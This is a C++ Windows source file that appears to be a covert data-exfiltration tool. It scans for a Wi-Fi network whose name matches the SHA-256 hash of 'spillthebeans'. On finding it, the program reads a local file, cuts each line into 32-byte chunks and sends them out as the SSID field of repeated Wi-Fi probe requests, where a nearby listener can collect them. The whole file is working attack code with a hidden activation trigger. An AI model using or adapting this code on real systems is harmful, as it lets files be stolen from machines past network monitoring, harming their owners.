#define WLAN_NOTIFICATION_SOURCE_NONE 0
#define WLAN_NOTIFICATION_SOURCE_ACM 0x00000008

#include <stdio.h>
#include <windows.h>
#include <wlanapi.h>
#include <iostream>
#include <fstream>
#include <vector>
#include "sha256.h"

using std::cout;
using std::string;
using namespace std;

BOOL bWait;

VOID WlanNotification(WLAN_NOTIFICATION_DATA *wlanNotifData,VOID *p)
{
    if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_complete) {
        bWait = false;
    }
    else if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_fail) {
        cout << "Scanning failed with error: " << wlanNotifData->pData << std::endl;
        bWait = false;
    }
}

bool IsVistaOrHigher()
{
    OSVERSIONINFO osVersion; ZeroMemory(&osVersion, sizeof(OSVERSIONINFO));
    osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if(!GetVersionEx(&osVersion))
        return false;

    if(osVersion.dwMajorVersion >= 6)
        return true;
    return false;
}

vector<string> ScanWifiNetworks(HANDLE hWlan, GUID guidInterface) {
    if(hWlan == NULL)
        throw "Uhh, hWlan not initilised in ScanWifiNetworks";

    WLAN_AVAILABLE_NETWORK_LIST *wlanNetworkList = (WLAN_AVAILABLE_NETWORK_LIST*)WlanAllocateMemory(sizeof(WLAN_AVAILABLE_NETWORK_LIST));
        ZeroMemory(wlanNetworkList, sizeof(WLAN_AVAILABLE_NETWORK_LIST));

    DWORD dwPrevNotif = 0;

    int dwError = WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE, (WLAN_NOTIFICATION_CALLBACK)WlanNotification, NULL, NULL, &dwPrevNotif);
        if(dwError != ERROR_SUCCESS)
            throw("[x] Unable to register for notifications");


    printf("[i] Scanning for nearby networks...\n");
        dwError = WlanScan(hWlan, &guidInterface, NULL, NULL, NULL);
        if(dwError != ERROR_SUCCESS)
            throw("[x] Scan failed, check adapter is enabled");

        // Yawn...
    while(bWait)
        Sleep(100);



    vector <string> OutputNetworks;
    dwError = WlanGetAvailableNetworkList(hWlan, &guidInterface, 0, NULL, &wlanNetworkList);
    if(dwError != ERROR_SUCCESS)
        throw("[x] Unable to obtain network list");

    for(unsigned int i = 0; i < wlanNetworkList->dwNumberOfItems; i++)
        OutputNetworks.push_back(string((const char*)wlanNetworkList->Network[i].dot11Ssid.ucSSID));

    WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE, NULL, NULL, NULL, &dwPrevNotif);


    if(wlanNetworkList) {
        WlanFreeMemory(wlanNetworkList);
    }

    return OutputNetworks;
}


void sendData(HANDLE hWlan, GUID interfaceGUID, const string& data) {
  //Dont need to wait for this to complete. Its kinda like UDP
    cout << "Sending: " << data << endl;
    DWORD dwPrevNotif = 0;

    int dwError = WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_ACM, TRUE, (WLAN_NOTIFICATION_CALLBACK)WlanNotification, NULL, NULL, &dwPrevNotif);
        if(dwError != ERROR_SUCCESS)
            throw("[x] Unable to register for notifications");


    DOT11_SSID Data;
    Data.uSSIDLength = data.size(); // In the (hopefully) non-existant event that data is < 32
    memcpy(Data.ucSSID, data.c_str(), data.size());

    do {
        dwError = WlanScan(hWlan, &interfaceGUID, &Data, NULL, NULL);
        if(dwError != ERROR_SUCCESS && dwError != ERROR_BUSY) {
                cout << "Erro no: " << dwError << endl;
            throw("[x] Send failed, check adapter is enabled");
        }
        Sleep(200);
    } while(dwError == ERROR_BUSY);

    while(bWait)
        Sleep(100);

    WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE, NULL, NULL, NULL, &dwPrevNotif);

}

void BeginTransfer(const string& Path, HANDLE hWlan, GUID interfaceGUID) {
    ifstream FileToCopy(Path.c_str());
    if(!FileToCopy.is_open() || !FileToCopy.good())
        throw("[x] Error file not openable");

    string line;
    vector<string> dataToSend;

    while( getline(FileToCopy, line) ) {

        string LinePart;
        for(size_t j = 0, i = 0; j < line.size(); j++) {
            i++;
            LinePart += line[j];

            if(i == 32 || j == line.size()-1 ) {
                i = 0;
                dataToSend.push_back(LinePart);
                LinePart = "";
            }
        }

        for(size_t i = 0; i < dataToSend.size(); i++)
            sendData(hWlan, interfaceGUID, dataToSend[i]);

    }

   FileToCopy.close();
}

const string TRIGGER_NETWORK = "spillthebeans";


int main(int argc, char *argv[])
{


    string filepath = "test.file";


    HANDLE hWlan = NULL;

    DWORD dwError = 0;
    DWORD dwSupportedVersion = 0;
    DWORD dwClientVersion = (IsVistaOrHigher() ? 2 : 1);

    GUID* guidInterface = NULL;

    WLAN_INTERFACE_INFO_LIST *wlanInterfaceList = (WLAN_INTERFACE_INFO_LIST*)WlanAllocateMemory(sizeof(WLAN_INTERFACE_INFO_LIST));
    ZeroMemory(wlanInterfaceList, sizeof(WLAN_INTERFACE_INFO_LIST));

    try
    {
        dwError = WlanOpenHandle(dwClientVersion, NULL, &dwSupportedVersion, &hWlan);
        if(dwError != ERROR_SUCCESS)
            throw("[x] Unable access wireless interface");

        dwError = WlanEnumInterfaces(hWlan, NULL, &wlanInterfaceList);
        if(dwError != ERROR_SUCCESS)
            throw("[x] Unable to enum wireless interfaces");

        for(size_t i = 0; i < wlanInterfaceList->dwNumberOfItems; i++) { // For the first interface that is wireless and isnt disabled.
                dwError = wlanInterfaceList->InterfaceInfo[i].isState;
                wprintf(L"[!] Found adapter %s\n", wlanInterfaceList->InterfaceInfo[i].strInterfaceDescription);

                if(dwError == wlan_interface_state_not_ready)
                        continue;

                guidInterface = &wlanInterfaceList->InterfaceInfo[i].InterfaceGuid;

        }

        if(guidInterface == NULL)
            throw("[x] All interfaces disabled or non-existant.");


        vector <string> networks = ScanWifiNetworks( hWlan, *guidInterface);
        for(auto ssid : networks)
            if(ssid == sha256raw(TRIGGER_NETWORK)) {
                BeginTransfer(filepath, hWlan, *guidInterface);
            }

    }
    catch(char const*szError)
    {
        cout << szError << std::endl;
        system("pause");
    }


    if(wlanInterfaceList)
    {
        WlanFreeMemory(wlanInterfaceList);
    }
    if(hWlan)
    {
        WlanCloseHandle(hWlan, NULL);
    }

    return dwError;

}
